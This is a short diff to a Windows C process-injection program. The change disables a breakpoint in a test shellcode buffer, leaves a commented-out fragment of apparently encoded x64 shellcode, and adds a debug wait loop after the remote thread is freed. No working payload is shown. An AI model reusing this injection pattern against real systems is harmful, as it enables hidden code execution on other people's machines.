@@ -53,7 +53,7 @@ int main(int argc, char *argv[]) {
 
     // Modified shellcode for debugging
     unsigned char shellcode[] =
-        "\xCC"          // Breakpoint
+        //"\xCC"          // Breakpoint
         "\xC3";         // Near return
         /*
         "\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef\xff"
@@ -114,6 +114,12 @@ int main(int argc, char *argv[]) {
     WaitForSingleObject(remoteThread, INFINITE);                                                                            // Wait for the thread to finish
     VirtualFreeEx(processHandle, remoteBuffer, sizeof shellcode, MEM_RELEASE);                                              // Free the memory we allocated
     CloseHandle(processHandle);                                                                                             // Close handle since we are no longer using it
+
+    // speeeeeeeeeeeeeeen waiting for crash (debug)
+    for (int i = 0; i < 180; i++) {
+        printf("Waiting %d...\n", i+1);
+        Sleep(1000);
+    }
 
     return 0;
 }
